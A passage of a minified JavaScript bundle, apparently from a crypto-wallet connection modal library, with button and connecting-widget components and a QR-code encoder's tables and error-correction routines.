  }

  button[data-size='sm'] > wui-icon {
    width: 12px;
    height: 12px;
  }

  button[data-size='md'] > wui-icon {
    width: 14px;
    height: 14px;
  }

  wui-image {
    border-radius: var(--wui-border-radius-3xl);
    overflow: hidden;
  }

  button.disabled > wui-icon,
  button.disabled > wui-image {
    filter: grayscale(1);
  }

  button[data-variant='main'] > wui-image {
    box-shadow: inset 0 0 0 1px var(--wui-color-accent-090);
  }

  button[data-variant='shade'] > wui-image,
  button[data-variant='gray'] > wui-image {
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  @media (hover: hover) and (pointer: fine) {
    button[data-variant='main']:focus-visible {
      background-color: var(--wui-color-accent-090);
    }

    button[data-variant='main']:hover:enabled {
      background-color: var(--wui-color-accent-090);
    }

    button[data-variant='main']:active:enabled {
      background-color: var(--wui-color-accent-080);
    }

    button[data-variant='accent']:hover:enabled {
      background-color: var(--wui-color-accent-glass-015);
    }

    button[data-variant='accent']:active:enabled {
      background-color: var(--wui-color-accent-glass-020);
    }

    button[data-variant='shade']:focus-visible,
    button[data-variant='gray']:focus-visible,
    button[data-variant='shade']:hover,
    button[data-variant='gray']:hover {
      background-color: var(--wui-color-gray-glass-002);
    }

    button[data-variant='gray']:active,
    button[data-variant='shade']:active {
      background-color: var(--wui-color-gray-glass-005);
    }
  }

  button.disabled {
    color: var(--wui-color-gray-glass-020);
    background-color: var(--wui-color-gray-glass-002);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    pointer-events: none;
  }
`,aa=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let cs=class extends fe{constructor(){super(...arguments),this.variant="accent",this.imageSrc="",this.disabled=!1,this.icon="externalLink",this.size="md",this.text=""}render(){const t=this.size==="sm"?"small-600":"paragraph-600";return U`
      <button
        class=${this.disabled?"disabled":""}
        data-variant=${this.variant}
        data-size=${this.size}
      >
        ${this.imageSrc?U`<wui-image src=${this.imageSrc}></wui-image>`:null}
        <wui-text variant=${t} color="inherit"> ${this.text} </wui-text>
        <wui-icon name=${this.icon} color="inherit" size="inherit"></wui-icon>
      </button>
    `}};cs.styles=[Qe,hr,GG],aa([F()],cs.prototype,"variant",void 0),aa([F()],cs.prototype,"imageSrc",void 0),aa([F({type:Boolean})],cs.prototype,"disabled",void 0),aa([F()],cs.prototype,"icon",void 0),aa([F()],cs.prototype,"size",void 0),aa([F()],cs.prototype,"text",void 0),cs=aa([he("wui-chip-button")],cs);var KG=Ae`
  wui-flex {
    width: 100%;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
  }
`,i0=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let pl=class extends fe{constructor(){super(...arguments),this.disabled=!1,this.label="",this.buttonLabel=""}render(){return U`
      <wui-flex
        justifyContent="space-between"
        alignItems="center"
        .padding=${["1xs","2l","1xs","2l"]}
      >
        <wui-text variant="paragraph-500" color="fg-200">${this.label}</wui-text>
        <wui-chip-button size="sm" variant="shade" text=${this.buttonLabel} icon="chevronRight">
        </wui-chip-button>
      </wui-flex>
    `}};pl.styles=[Qe,hr,KG],i0([F({type:Boolean})],pl.prototype,"disabled",void 0),i0([F()],pl.prototype,"label",void 0),i0([F()],pl.prototype,"buttonLabel",void 0),pl=i0([he("wui-cta-button")],pl);var ZG=Ae`
  :host {
    display: block;
    padding: 0 var(--wui-spacing-xl) var(--wui-spacing-xl);
  }
`,h8=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let s0=class extends fe{constructor(){super(...arguments),this.wallet=void 0}render(){if(!this.wallet)return this.style.display="none",null;const{name:t,app_store:e,play_store:r,chrome_store:n,homepage:i}=this.wallet,s=te.isMobile(),o=te.isIos(),a=te.isAndroid(),c=[e,r,i,n].filter(Boolean).length>1,l=Wt.getTruncateString({string:t,charsStart:12,charsEnd:0,truncate:"end"});return c&&!s?U`
        <wui-cta-button
          label=${`Don't have ${l}?`}
          buttonLabel="Get"
          @click=${()=>se.push("Downloads",{wallet:this.wallet})}
        ></wui-cta-button>
      `:!c&&i?U`
        <wui-cta-button
          label=${`Don't have ${l}?`}
          buttonLabel="Get"
          @click=${this.onHomePage.bind(this)}
        ></wui-cta-button>
      `:e&&o?U`
        <wui-cta-button
          label=${`Don't have ${l}?`}
          buttonLabel="Get"
          @click=${this.onAppStore.bind(this)}
        ></wui-cta-button>
      `:r&&a?U`
        <wui-cta-button
          label=${`Don't have ${l}?`}
          buttonLabel="Get"
          @click=${this.onPlayStore.bind(this)}
        ></wui-cta-button>
      `:(this.style.display="none",null)}onAppStore(){var t;(t=this.wallet)!=null&&t.app_store&&te.openHref(this.wallet.app_store,"_blank")}onPlayStore(){var t;(t=this.wallet)!=null&&t.play_store&&te.openHref(this.wallet.play_store,"_blank")}onHomePage(){var t;(t=this.wallet)!=null&&t.homepage&&te.openHref(this.wallet.homepage,"_blank")}};s0.styles=[ZG],h8([F({type:Object})],s0.prototype,"wallet",void 0),s0=h8([he("w3m-mobile-download-links")],s0);var JG=Ae`
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }

  wui-flex:first-child:not(:only-child) {
    position: relative;
  }

  wui-loading-thumbnail {
    position: absolute;
  }

  wui-icon-box {
    position: absolute;
    right: calc(var(--wui-spacing-3xs) * -1);
    bottom: calc(var(--wui-spacing-3xs) * -1);
    opacity: 0;
    transform: scale(0.5);
    transition-property: opacity, transform;
    transition-duration: var(--wui-duration-lg);
    transition-timing-function: var(--wui-ease-out-power-2);
    will-change: opacity, transform;
  }

  wui-text[align='center'] {
    width: 100%;
    padding: 0px var(--wui-spacing-l);
  }

  [data-error='true'] wui-icon-box {
    opacity: 1;
    transform: scale(1);
  }

  [data-error='true'] > wui-flex:first-child {
    animation: shake 250ms cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
  }

  [data-retry='false'] wui-link {
    display: none;
  }

  [data-retry='true'] wui-link {
    display: block;
    opacity: 1;
  }
`,Jn=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};class nr extends fe{constructor(){var e,r,n,i,s;super(),this.wallet=(e=se.state.data)==null?void 0:e.wallet,this.connector=(r=se.state.data)==null?void 0:r.connector,this.timeout=void 0,this.secondaryBtnIcon="refresh",this.onConnect=void 0,this.onRender=void 0,this.onAutoConnect=void 0,this.isWalletConnect=!0,this.unsubscribe=[],this.imageSrc=Mt.getWalletImage(this.wallet)??Mt.getConnectorImage(this.connector),this.name=((n=this.wallet)==null?void 0:n.name)??((i=this.connector)==null?void 0:i.name)??"Wallet",this.isRetrying=!1,this.uri=we.state.wcUri,this.error=we.state.wcError,this.ready=!1,this.showRetry=!1,this.secondaryBtnLabel="Try again",this.secondaryLabel="Accept connection request in the wallet",this.buffering=!1,this.isLoading=!1,this.isMobile=!1,this.onRetry=void 0,this.unsubscribe.push(we.subscribeKey("wcUri",o=>{var a;this.uri=o,this.isRetrying&&this.onRetry&&(this.isRetrying=!1,(a=this.onConnect)==null||a.call(this))}),we.subscribeKey("wcError",o=>this.error=o),we.subscribeKey("buffering",o=>this.buffering=o)),(te.isTelegram()||te.isSafari())&&te.isIos()&&we.state.wcUri&&((s=this.onConnect)==null||s.call(this))}firstUpdated(){var e;(e=this.onAutoConnect)==null||e.call(this),this.showRetry=!this.onAutoConnect}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),clearTimeout(this.timeout)}render(){var n;(n=this.onRender)==null||n.call(this),this.onShowRetry();const e=this.error?"Connection can be declined if a previous request is still active":this.secondaryLabel;let r=`Continue in ${this.name}`;return this.buffering&&(r="Connecting..."),this.error&&(r="Connection declined"),U`
      <wui-flex
        data-error=${Ee(this.error)}
        data-retry=${this.showRetry}
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","xl","xl"]}
        gap="xl"
      >
        <wui-flex justifyContent="center" alignItems="center">
          <wui-wallet-image size="lg" imageSrc=${Ee(this.imageSrc)}></wui-wallet-image>

          ${this.error?null:this.loaderTemplate()}

          <wui-icon-box
            backgroundColor="error-100"
            background="opaque"
            iconColor="error-100"
            icon="close"
            size="sm"
            border
            borderColor="wui-color-bg-125"
          ></wui-icon-box>
        </wui-flex>

        <wui-flex flexDirection="column" alignItems="center" gap="xs">
          <wui-text variant="paragraph-500" color=${this.error?"error-100":"fg-100"}>
            ${r}
          </wui-text>
          <wui-text align="center" variant="small-500" color="fg-200">${e}</wui-text>
        </wui-flex>

        ${this.secondaryBtnLabel?U`
              <wui-button
                variant="accent"
                size="md"
                ?disabled=${this.isRetrying||!this.error&&this.buffering||this.isLoading}
                @click=${this.onTryAgain.bind(this)}
                data-testid="w3m-connecting-widget-secondary-button"
              >
                <wui-icon color="inherit" slot="iconLeft" name=${this.secondaryBtnIcon}></wui-icon>
                ${this.secondaryBtnLabel}
              </wui-button>
            `:null}
      </wui-flex>

      ${this.isWalletConnect?U`
            <wui-flex .padding=${["0","xl","xl","xl"]} justifyContent="center">
              <wui-link @click=${this.onCopyUri} color="fg-200" data-testid="wui-link-copy">
                <wui-icon size="xs" color="fg-200" slot="iconLeft" name="copy"></wui-icon>
                Copy link
              </wui-link>
            </wui-flex>
          `:null}

      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}onShowRetry(){var e,r;this.error&&!this.showRetry&&(this.showRetry=!0,(r=(e=this.shadowRoot)==null?void 0:e.querySelector("wui-button"))==null||r.animate([{opacity:0},{opacity:1}],{fill:"forwards",easing:"ease"}))}onTryAgain(){var e,r;this.buffering||(we.setWcError(!1),this.onRetry?(this.isRetrying=!0,(e=this.onRetry)==null||e.call(this)):(r=this.onConnect)==null||r.call(this))}loaderTemplate(){const e=Bt.state.themeVariables["--w3m-border-radius-master"],r=e?parseInt(e.replace("px",""),10):4;return U`<wui-loading-thumbnail radius=${r*9}></wui-loading-thumbnail>`}onCopyUri(){try{this.uri&&(te.copyToClopboard(this.uri),ut.showSuccess("Link copied"))}catch{ut.showError("Failed to copy")}}}nr.styles=JG,Jn([le()],nr.prototype,"isRetrying",void 0),Jn([le()],nr.prototype,"uri",void 0),Jn([le()],nr.prototype,"error",void 0),Jn([le()],nr.prototype,"ready",void 0),Jn([le()],nr.prototype,"showRetry",void 0),Jn([le()],nr.prototype,"secondaryBtnLabel",void 0),Jn([le()],nr.prototype,"secondaryLabel",void 0),Jn([le()],nr.prototype,"buffering",void 0),Jn([le()],nr.prototype,"isLoading",void 0),Jn([F({type:Boolean})],nr.prototype,"isMobile",void 0),Jn([F()],nr.prototype,"onRetry",void 0);var QG=function(t,e,r,n){var i=arguments.length,s=i<3?e:n===null?n=Object.getOwnPropertyDescriptor(e,r):n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let d8=class extends nr{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-browser: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.onAutoConnect=this.onConnectProxy.bind(this),De.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"browser"}})}async onConnectProxy(){var t;try{this.error=!1;const{connectors:e}=ae.state,r=e.find(n=>{var i,s,o;return n.type==="ANNOUNCED"&&((i=n.info)==null?void 0:i.rdns)===((s=this.wallet)==null?void 0:s.rdns)||n.type==="INJECTED"||n.name===((o=this.wallet)==null?void 0:o.name)});if(r)await we.connectExternal(r,r.chain);else throw new Error("w3m-connecting-wc-browser: No connector found");qe.close(),De.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:"browser",name:((t=this.wallet)==null?void 0:t.name)||"Unknown"}})}catch(e){De.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:(e==null?void 0:e.message)??"Unknown"}}),this.error=!0}}};d8=QG([he("w3m-connecting-wc-browser")],d8);var YG=function(t,e,r,n){var i=arguments.length,s=i<3?e:n===null?n=Object.getOwnPropertyDescriptor(e,r):n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let f8=class extends nr{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-desktop: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.onRender=this.onRenderProxy.bind(this),De.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"desktop"}})}onRenderProxy(){var t;!this.ready&&this.uri&&(this.ready=!0,(t=this.onConnect)==null||t.call(this))}onConnectProxy(){var t;if((t=this.wallet)!=null&&t.desktop_link&&this.uri)try{this.error=!1;const{desktop_link:e,name:r}=this.wallet,{redirect:n,href:i}=te.formatNativeUrl(e,this.uri);we.setWcLinking({name:r,href:i}),we.setRecentWallet(this.wallet),te.openHref(n,"_blank")}catch{this.error=!0}}};f8=YG([he("w3m-connecting-wc-desktop")],f8);var XG=function(t,e,r,n){var i=arguments.length,s=i<3?e:n===null?n=Object.getOwnPropertyDescriptor(e,r):n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let p8=class extends nr{constructor(){if(super(),this.btnLabelTimeout=void 0,this.labelTimeout=void 0,this.onRender=()=>{var t;!this.ready&&this.uri&&(this.ready=!0,(t=this.onConnect)==null||t.call(this))},this.onConnect=()=>{var t;if((t=this.wallet)!=null&&t.mobile_link&&this.uri)try{this.error=!1;const{mobile_link:e,name:r}=this.wallet,{redirect:n,href:i}=te.formatNativeUrl(e,this.uri);we.setWcLinking({name:r,href:i}),we.setRecentWallet(this.wallet);const s=te.isIframe()?"_top":"_self";te.openHref(n,s),clearTimeout(this.labelTimeout),this.secondaryLabel=Ut.CONNECT_LABELS.MOBILE}catch(e){De.sendEvent({type:"track",event:"CONNECT_PROXY_ERROR",properties:{message:e instanceof Error?e.message:"Error parsing the deeplink",uri:this.uri,mobile_link:this.wallet.mobile_link,name:this.wallet.name}}),this.error=!0}},!this.wallet)throw new Error("w3m-connecting-wc-mobile: No wallet provided");this.initializeStateAndTimers(),document.addEventListener("visibilitychange",this.onBuffering.bind(this)),De.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"mobile"}})}disconnectedCallback(){super.disconnectedCallback(),document.removeEventListener("visibilitychange",this.onBuffering.bind(this)),clearTimeout(this.btnLabelTimeout),clearTimeout(this.labelTimeout)}initializeStateAndTimers(){this.secondaryBtnLabel=void 0,this.secondaryLabel=Ut.CONNECT_LABELS.MOBILE,this.btnLabelTimeout=setTimeout(()=>{this.secondaryBtnLabel="Try again",this.secondaryLabel=Ut.CONNECT_LABELS.MOBILE},Ut.FIVE_SEC_MS),this.labelTimeout=setTimeout(()=>{this.secondaryLabel="Hold tight... it's taking longer than expected"},Ut.THREE_SEC_MS)}onBuffering(){const t=te.isIos();(document==null?void 0:document.visibilityState)==="visible"&&!this.error&&t&&(we.setBuffering(!0),setTimeout(()=>{we.setBuffering(!1)},5e3))}onTryAgain(){this.buffering||(clearTimeout(this.btnLabelTimeout),clearTimeout(this.labelTimeout),this.initializeStateAndTimers(),we.setWcError(!1),this.onConnect())}};p8=XG([he("w3m-connecting-wc-mobile")],p8);var hd={},eK=function(){return typeof Promise=="function"&&Promise.prototype&&Promise.prototype.then},B9={},pn={};let rm;const tK=[0,26,44,70,100,134,172,196,242,292,346,404,466,532,581,655,733,815,901,991,1085,1156,1258,1364,1474,1588,1706,1828,1921,2051,2185,2323,2465,2611,2761,2876,3034,3196,3362,3532,3706];pn.getSymbolSize=function(t){if(!t)throw new Error('"version" cannot be null or undefined');if(t<1||t>40)throw new Error('"version" should be in range from 1 to 40');return t*4+17},pn.getSymbolTotalCodewords=function(t){return tK[t]},pn.getBCHDigit=function(t){let e=0;for(;t!==0;)e++,t>>>=1;return e},pn.setToSJISFunction=function(t){if(typeof t!="function")throw new Error('"toSJISFunc" is not a valid function.');rm=t},pn.isKanjiModeEnabled=function(){return typeof rm<"u"},pn.toSJIS=function(t){return rm(t)};var p1={};(function(t){t.L={bit:1},t.M={bit:0},t.Q={bit:3},t.H={bit:2};function e(r){if(typeof r!="string")throw new Error("Param is not a string");switch(r.toLowerCase()){case"l":case"low":return t.L;case"m":case"medium":return t.M;case"q":case"quartile":return t.Q;case"h":case"high":return t.H;default:throw new Error("Unknown EC Level: "+r)}}t.isValid=function(r){return r&&typeof r.bit<"u"&&r.bit>=0&&r.bit<4},t.from=function(r,n){if(t.isValid(r))return r;try{return e(r)}catch{return n}}})(p1);function L9(){this.buffer=[],this.length=0}L9.prototype={get:function(t){const e=Math.floor(t/8);return(this.buffer[e]>>>7-t%8&1)===1},put:function(t,e){for(let r=0;r<e;r++)this.putBit((t>>>e-r-1&1)===1)},getLengthInBits:function(){return this.length},putBit:function(t){const e=Math.floor(this.length/8);this.buffer.length<=e&&this.buffer.push(0),t&&(this.buffer[e]|=128>>>this.length%8),this.length++}};var rK=L9;function dd(t){if(!t||t<1)throw new Error("BitMatrix size must be defined and greater than 0");this.size=t,this.data=new Uint8Array(t*t),this.reservedBit=new Uint8Array(t*t)}dd.prototype.set=function(t,e,r,n){const i=t*this.size+e;this.data[i]=r,n&&(this.reservedBit[i]=!0)},dd.prototype.get=function(t,e){return this.data[t*this.size+e]},dd.prototype.xor=function(t,e,r){this.data[t*this.size+e]^=r},dd.prototype.isReserved=function(t,e){return this.reservedBit[t*this.size+e]};var nK=dd,U9={};(function(t){const e=pn.getSymbolSize;t.getRowColCoords=function(r){if(r===1)return[];const n=Math.floor(r/7)+2,i=e(r),s=i===145?26:Math.ceil((i-13)/(2*n-2))*2,o=[i-7];for(let a=1;a<n-1;a++)o[a]=o[a-1]-s;return o.push(6),o.reverse()},t.getPositions=function(r){const n=[],i=t.getRowColCoords(r),s=i.length;for(let o=0;o<s;o++)for(let a=0;a<s;a++)o===0&&a===0||o===0&&a===s-1||o===s-1&&a===0||n.push([i[o],i[a]]);return n}})(U9);var M9={};const iK=pn.getSymbolSize,g8=7;M9.getPositions=function(t){const e=iK(t);return[[0,0],[e-g8,0],[0,e-g8]]};var F9={};(function(t){t.Patterns={PATTERN000:0,PATTERN001:1,PATTERN010:2,PATTERN011:3,PATTERN100:4,PATTERN101:5,PATTERN110:6,PATTERN111:7};const e={N1:3,N2:3,N3:40,N4:10};t.isValid=function(n){return n!=null&&n!==""&&!isNaN(n)&&n>=0&&n<=7},t.from=function(n){return t.isValid(n)?parseInt(n,10):void 0},t.getPenaltyN1=function(n){const i=n.size;let s=0,o=0,a=0,c=null,l=null;for(let u=0;u<i;u++){o=a=0,c=l=null;for(let h=0;h<i;h++){let d=n.get(u,h);d===c?o++:(o>=5&&(s+=e.N1+(o-5)),c=d,o=1),d=n.get(h,u),d===l?a++:(a>=5&&(s+=e.N1+(a-5)),l=d,a=1)}o>=5&&(s+=e.N1+(o-5)),a>=5&&(s+=e.N1+(a-5))}return s},t.getPenaltyN2=function(n){const i=n.size;let s=0;for(let o=0;o<i-1;o++)for(let a=0;a<i-1;a++){const c=n.get(o,a)+n.get(o,a+1)+n.get(o+1,a)+n.get(o+1,a+1);(c===4||c===0)&&s++}return s*e.N2},t.getPenaltyN3=function(n){const i=n.size;let s=0,o=0,a=0;for(let c=0;c<i;c++){o=a=0;for(let l=0;l<i;l++)o=o<<1&2047|n.get(c,l),l>=10&&(o===1488||o===93)&&s++,a=a<<1&2047|n.get(l,c),l>=10&&(a===1488||a===93)&&s++}return s*e.N3},t.getPenaltyN4=function(n){let i=0;const s=n.data.length;for(let o=0;o<s;o++)i+=n.data[o];return Math.abs(Math.ceil(i*100/s/5)-10)*e.N4};function r(n,i,s){switch(n){case t.Patterns.PATTERN000:return(i+s)%2===0;case t.Patterns.PATTERN001:return i%2===0;case t.Patterns.PATTERN010:return s%3===0;case t.Patterns.PATTERN011:return(i+s)%3===0;case t.Patterns.PATTERN100:return(Math.floor(i/2)+Math.floor(s/3))%2===0;case t.Patterns.PATTERN101:return i*s%2+i*s%3===0;case t.Patterns.PATTERN110:return(i*s%2+i*s%3)%2===0;case t.Patterns.PATTERN111:return(i*s%3+(i+s)%2)%2===0;default:throw new Error("bad maskPattern:"+n)}}t.applyMask=function(n,i){const s=i.size;for(let o=0;o<s;o++)for(let a=0;a<s;a++)i.isReserved(a,o)||i.xor(a,o,r(n,a,o))},t.getBestMask=function(n,i){const s=Object.keys(t.Patterns).length;let o=0,a=1/0;for(let c=0;c<s;c++){i(c),t.applyMask(c,n);const l=t.getPenaltyN1(n)+t.getPenaltyN2(n)+t.getPenaltyN3(n)+t.getPenaltyN4(n);t.applyMask(c,n),l<a&&(a=l,o=c)}return o}})(F9);var wg={};const to=p1,o0=[1,1,1,1,1,1,1,1,1,1,2,2,1,2,2,4,1,2,4,4,2,4,4,4,2,4,6,5,2,4,6,6,2,5,8,8,4,5,8,8,4,5,8,11,4,8,10,11,4,9,12,16,4,9,16,16,6,10,12,18,6,10,17,16,6,11,16,19,6,13,18,21,7,14,21,25,8,16,20,25,8,17,23,25,9,17,23,34,9,18,25,30,10,20,27,32,12,21,29,35,12,23,34,37,12,25,34,40,13,26,35,42,14,28,38,45,15,29,40,48,16,31,43,51,17,33,45,54,18,35,48,57,19,37,51,60,19,38,53,63,20,40,56,66,21,43,59,70,22,45,62,74,24,47,65,77,25,49,68,81],a0=[7,10,13,17,10,16,22,28,15,26,36,44,20,36,52,64,26,48,72,88,36,64,96,112,40,72,108,130,48,88,132,156,60,110,160,192,72,130,192,224,80,150,224,264,96,176,260,308,104,198,288,352,120,216,320,384,132,240,360,432,144,280,408,480,168,308,448,532,180,338,504,588,196,364,546,650,224,416,600,700,224,442,644,750,252,476,690,816,270,504,750,900,300,560,810,960,312,588,870,1050,336,644,952,1110,360,700,1020,1200,390,728,1050,1260,420,784,1140,1350,450,812,1200,1440,480,868,1290,1530,510,924,1350,1620,540,980,1440,1710,570,1036,1530,1800,570,1064,1590,1890,600,1120,1680,1980,630,1204,1770,2100,660,1260,1860,2220,720,1316,1950,2310,750,1372,2040,2430];wg.getBlocksCount=function(t,e){switch(e){case to.L:return o0[(t-1)*4+0];case to.M:return o0[(t-1)*4+1];case to.Q:return o0[(t-1)*4+2];case to.H:return o0[(t-1)*4+3];default:return}},wg.getTotalCodewordsCount=function(t,e){switch(e){case to.L:return a0[(t-1)*4+0];case to.M:return a0[(t-1)*4+1];case to.Q:return a0[(t-1)*4+2];case to.H:return a0[(t-1)*4+3];default:return}};var z9={},c0={};const Gh=new Uint8Array(512),l0=new Uint8Array(256);(function(){let t=1;for(let e=0;e<255;e++)Gh[e]=t,l0[t]=e,t<<=1,t&256&&(t^=285);for(let e=255;e<512;e++)Gh[e]=Gh[e-255]})(),c0.log=function(t){if(t<1)throw new Error("log("+t+")");return l0[t]},c0.exp=function(t){return Gh[t]},c0.mul=function(t,e){return t===0||e===0?0:Gh[l0[t]+l0[e]]},function(t){const e=c0;t.mul=function(r,n){const i=new Uint8Array(r.length+n.length-1);for(let s=0;s<r.length;s++)for(let o=0;o<n.length;o++)i[s+o]^=e.mul(r[s],n[o]);return i},t.mod=function(r,n){let i=new Uint8Array(r);for(;i.length-n.length>=0;){const s=i[0];for(let a=0;a<n.length;a++)i[a]^=e.mul(n[a],s);let o=0;for(;o<i.length&&i[o]===0;)o++;i=i.slice(o)}return i},t.generateECPolynomial=function(r){let n=new Uint8Array([1]);for(let i=0;i<r;i++)n=t.mul(n,new Uint8Array([1,e.exp(i)]));return n}}(z9);const w8=z9;function My(t){this.genPoly=void 0,this.degree=t,this.degree&&this.initialize(this.degree)}My.prototype.initialize=function(t){this.degree=t,this.genPoly=w8.generateECPolynomial(this.degree)},My.prototype.encode=function(t){if(!this.genPoly)throw new Error("Encoder not initialized");const e=new Uint8Array(t.length+this.degree);e.set(t);const r=w8.mod(e,this.genPoly),n=this.degree-r.length;if(n>0){const i=new Uint8Array(this.degree);return i.set(r,n),i}return r};var sK=My,j9={},Ho={},Fy={};Fy.isValid=function(t){return!isNaN(t)&&t>=1&&t<=40};var ji={};const H9="[0-9]+",oK="[A-Z $%*+\\-./:]+";let pf="(?:[u3000-u303F]|[u3040-u309F]|[u30A0-u30FF]|[uFF00-uFFEF]|[u4E00-u9FAF]|[u2605-u2606]|[u2190-u2195]|u203B|[u2010u2015u2018u2019u2025u2026u201Cu201Du2225u2260]|[u0391-u0451]|[u00A7u00A8u00B1u00B4u00D7u00F7])+";pf=pf.replace(/u/g,"\\u");const aK="(?:(?![A-Z0-9 $%*+\\-./:]|"+pf+`)(?:.|[\r
]))+`;ji.KANJI=new RegExp(pf,"g"),ji.BYTE_KANJI=new RegExp("[^A-Z0-9 $%*+\\-./:]+","g"),ji.BYTE=new RegExp(aK,"g"),ji.NUMERIC=new RegExp(H9,"g"),ji.ALPHANUMERIC=new RegExp(oK,"g");const cK=new RegExp("^"+pf+"$"),lK=new RegExp("^"+H9+"$"),uK=new RegExp("^[A-Z0-9 $%*+\\-./:]+$");ji.testKanji=function(t){return cK.test(t)},ji.testNumeric=function(t){return lK.test(t)},ji.testAlphanumeric=function(t){return uK.test(t)},function(t){const e=Fy,r=ji;t.NUMERIC={id:"Numeric",bit:1,ccBits:[10,12,14]},t.ALPHANUMERIC={id:"Alphanumeric",bit:2,ccBits:[9,11,13]},t.BYTE={id:"Byte",bit:4,ccBits:[8,16,16]},t.KANJI={id:"Kanji",bit:8,ccBits:[8,10,12]},t.MIXED={bit:-1},t.getCharCountIndicator=function(i,s){if(!i.ccBits)throw new Error("Invalid mode: "+i);if(!e.isValid(s))throw new Error("Invalid version: "+s);return s>=1&&s<10?i.ccBits[0]:s<27?i.ccBits[1]:i.ccBits[2]},t.getBestModeForData=function(i){return r.testNumeric(i)?t.NUMERIC:r.testAlphanumeric(i)?t.ALPHANUMERIC:r.testKanji(i)?t.KANJI:t.BYTE},t.toString=function(i){if(i&&i.id)return i.id;throw new Error("Invalid mode")},t.isValid=function(i){return i&&i.bit&&i.ccBits};function n(i){if(typeof i!="string")throw new Error("Param is not a string");switch(i.toLowerCase()){case"numeric":return t.NUMERIC;case"alphanumeric":return t.ALPHANUMERIC;case"kanji":return t.KANJI;case"byte":return t.BYTE;default:throw new Error("Unknown mode: "+i)}}t.from=function(i,s){if(t.isValid(i))return i;try{return n(i)}catch{return s}}}(Ho),function(t){const e=pn,r=wg,n=p1,i=Ho,s=Fy,o=7973,a=e.getBCHDigit(o);function c(d,f,g){for(let p=1;p<=40;p++)if(f<=t.getCapacity(p,g,d))return p}function l(d,f){return i.getCharCountIndicator(d,f)+4}function u(d,f){let g=0;return d.forEach(function(p){const w=l(p.mode,f);g+=w+p.getBitsLength()}),g}function h(d,f){for(let g=1;g<=40;g++)if(u(d,g)<=t.getCapacity(g,f,i.MIXED))return g}t.from=function(d,f){return s.isValid(d)?parseInt(d,10):f},t.getCapacity=function(d,f,g){if(!s.isValid(d))throw new Error("Invalid QR Code version");typeof g>"u"&&(g=i.BYTE);const p=e.getSymbolTotalCodewords(d),w=r.getTotalCodewordsCount(d,f),m=(p-w)*8;if(g===i.MIXED)return m;const b=m-l(g,d);switch(g){case i.NUMERIC:return Math.floor(b/10*3);case i.ALPHANUMERIC:return Math.floor(b/11*2);case i.KANJI:return Math.floor(b/13);case i.BYTE:default:return Math.floor(b/8)}},t.getBestVersionForData=function(d,f){let g;const p=n.from(f,n.M);if(Array.isArray(d)){if(d.length>1)return h(d,p);if(d.length===0)return 1;g=d[0]}else g=d;return c(g.mode,g.getLength(),p)},t.getEncodedBits=function(d){if(!s.isValid(d)||d<7)throw new Error("Invalid QR Code version");let f=d<<12;for(;e.getBCHDigit(f)-a>=0;)f^=o<<e.getBCHDigit(f)-a;return d<<12|f}}(j9);var q9={};const zy=pn,V9=1335,hK=21522,m8=zy.getBCHDigit(V9);q9.getEncodedBits=function(t,e){const r=t.bit<<3|e;let n=r<<10;for(;zy.getBCHDigit(n)-m8>=0;)n^=V9<<zy.getBCHDigit(n)-m8;return(r<<10|n)^hK};var W9={};const dK=Ho;function 